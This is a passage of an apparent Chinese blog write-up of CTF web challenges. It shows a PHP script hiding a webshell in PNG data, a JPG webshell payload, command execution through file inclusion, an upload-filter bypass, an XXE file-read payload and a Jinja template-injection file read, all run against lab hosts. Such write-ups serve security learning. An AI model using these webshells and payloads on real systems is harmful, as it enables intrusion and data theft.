<span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p>
+<p><img src="16036353722974.png" alt="img"></p>
+<p>其内容如下：</p>
+<p><img src="16036354976650.png" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="16036356271476.png" alt="img"></p>
+<p>查看一下里面的 payload 是否还存在：</p>
+<p><img src="16036357015967.png" alt="img"></p>
+<p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p>
+<p>首先获取图片的上传地址为：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vul.xps.com:30010&#x2F;upload&#x2F;357481464.png</span><br></pre></td></tr></table></div></figure>
+
+
+<p><img src="1603635794598.png" alt="img"></p>
+<p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p>
+<p>Bash</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></div></figure>
+
+
+<p><img src="16036358617110.png" alt="img"></p>
+<p>貌似成功了，执行命令看看：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vul.xps.com:30010&#x2F;?0&#x3D;system&amp;file&#x3D;.&#x2F;upload&#x2F;357481464.png</span><br></pre></td></tr></table></div></figure>
+<p>POST 内容如下：</p>
+<p>Bash</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=cat /f14a4a4a4a444g</span><br></pre></td></tr></table></div></figure>
+
+
+<p><img src="16036360607524.png" alt="img"></p>
+
+        <h3 id="JPG"   >
+          <a href="#JPG" class="heading-link"><i class="fas fa-link"></i></a>JPG</h3>
+      <p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p>
+<p>这个脚本 Github 搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p>
+<p><strong>项目地址</strong>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/BlackFan/jpg_payload" >Github - lackFan/jpg_payload</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>准备一个 jpg 图片：</p>
+<p><img src="16036693924901.jpg" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="1603669426842.jpg" alt="img"></p>
+<p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></div></figure>
+<p>然后运行脚本插入 payload：</p>
+<p>Bash</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></div></figure>
+<p>生成的新图片为：</p>
+<p><img src="16036747206733.jpg" alt="img"></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><img src="1603674733221.jpg" alt="img"></p>
+<p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p>
+<p><img src="16036748931486.png" alt="img"></p>
+<p>无疑写 phpinfo() 是很容易成功的，但是 phpinfo() 并无实质性危害，我们需要插入真正的 webshell 才可以：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></div></figure>
+<blockquote>
+<p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p>
+</blockquote>
+<p><img src="1603675937154.jpg" alt="img"></p>
+<p>这个图马被 imagecreatefromjpeg 渲染后如下：</p>
+<p><img src="16036760334176.jpg" alt="img"></p>
+<p>查看一下 payload 是否存在：</p>
+<p><img src="16036761717904.png" alt="img"></p>
+<p>完美，尝试直接文件包含来执行攻击语句试试看：</p>
+<p><img src="16036764145479.png" alt="img"></p>
+<p><strong>JPG 坑点总结</strong></p>
+<ol>
+<li>需要被 imagecreatefromjpeg 渲染或再用工具</li>
+<li>图片找的稍微大一点 成功率更高</li>
+<li>Payload 语句越短成功率越高</li>
+<li>一张图片不行就换一张 不要死磕</li>
+<li>国光补充：貌似白色的图片成功率也比较高</li>
+<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种payload 成功率很高</li>
+</ol>
+
+        <h2 id="文件上传代码审计"   >
+          <a href="#文件上传代码审计" class="heading-link"><i class="fas fa-link"></i></a>文件上传代码审计</h2>
+      <p>此题看题目作者wp</p>
+<p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p>
+<p><img src="16036775446476.png" alt="img"></p>
+<p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p>
+<ul>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/macphp.html" >国光 - macOS 下优雅地配置 PHP 代码审计环境</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/09/xdebug.html" >国光 - Xdebug+宝塔+PHPStudy+VScode PHP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+</ul>
+<p>首先看第一个判断：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p>
+<p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code>为分隔，打散为数组：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p>
+<p>因为打散后会校验最后的后缀：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></div></figure>
+<p>这样执行完最后的拼接文件名的代码后：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></div></figure>
+<p>这样最后一步：</p>
+<p>Php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></div></figure>
+<p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p>
+<p>那么最终构造的数据包如下：</p>
+<p><img src="16036832903333.png" alt="img"></p>
+
+        <h2 id="xxe-lab"   >
+          <a href="#xxe-lab" class="heading-link"><i class="fas fa-link"></i></a>xxe-lab</h2>
+      <p>参考链接：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html" >https://www.freebuf.com/articles/web/177979.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>构建body：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></div></figure>
+<p>返回flag</p>
+
+        <h2 id="flask-template"   >
+          <a href="#flask-template" class="heading-link"><i class="fas fa-link"></i></a>flask-template</h2>
+      <p>百度到读取文件：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></div></figure>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.flame8.xyz">WhiteFlame</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.flame8.xyz/2021/02/10/WebGame2/">https://blog.flame8.xyz/2021/02/10/WebGame2/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://blog.flame8.xyz/tags/ctf/">ctf</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/02/03/awd/"><span class="paginator-prev__text">awd反思</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-number">1.</span> <span class="toc-text">
+          web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">2.</span> <span class="toc-text">
+          web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2"><span class="toc-number">3.</span> <span class="toc-text">
+          文件上传-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87mime%E9%99%90%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">
+          绕过mime限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">5.</span> <span class="toc-text">
+          htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">
+          文件头绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%BF%E6%8D%A2"><span class="toc-number">7.</span> <span class="toc-text">
+          字符串替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%BF%E6%8D%A2-2"><span class="toc-number">8.</span> <span class="toc-text">
+          字符串替换-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">9.</span> <span class="toc-text">
+          黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD-1"><span class="toc-number">10.</span> <span class="toc-text">
+          00截断-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD-2"><span class="toc-number">11.</span> <span class="toc-text">
+          00截断-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">12.</span> <span class="toc-text">
+          条件竞争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">13.</span> <span class="toc-text">
+          图片二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GIF"><span class="toc-number">13.1.</span> <span class="toc-text">
+          GIF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PNG"><span class="toc-number">13.2.</span> <span class="toc-text">
+          PNG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5-PLTE-%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">13.2.1.</span> <span class="toc-text">
+          写入 PLTE 数据块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5IDAT%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">13.2.2.</span> <span class="toc-text">
+          写入IDAT数据块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JPG"><span class="toc-number">13.3.</span> <span class="toc-text">
+          JPG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">14.</span> <span class="toc-text">
+          文件上传代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe-lab"><span class="toc-number">15.</span> <span class="toc-text">
+          xxe-lab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-template"><span class="toc-number">16.</span> <span class="toc-text">
+          flask-template</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>WhiteFlame</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.1</span></div><div><!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon={'token': '142237f73d2f4a7fab477d3e767ff8dc'}></script><!-- End Cloudflare Web Analytics --></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.1"></script><script src="/js/stun-boot.js?v=2.6.1"></script><script src="/js/scroll.js?v=2.6.1"></script><script src="/js/header.js?v=2.6.1"></script><script src="/js/sidebar.js?v=2.6.1"></script></body></html>
